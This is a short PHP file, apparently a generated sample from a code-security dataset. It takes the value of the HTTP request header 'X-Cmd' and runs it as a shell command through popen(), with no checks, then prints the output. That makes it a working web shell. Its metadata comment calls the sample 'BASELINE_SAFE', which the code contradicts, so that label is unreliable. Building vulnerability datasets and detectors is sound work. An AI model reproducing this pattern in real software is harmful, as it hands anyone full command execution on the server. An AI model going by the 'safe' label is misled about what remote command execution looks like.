<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_FOREACH_ISTR; SKELETON=S1; KEY=cmd; SINK=B6; VAR=v0102; HDR_NAME=X-Cmd */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = "";
foreach($h as $k=>$v){ if(strcasecmp((string)$k, "X-Cmd")===0){ $inp = (string)$v; break; } }
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B6($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
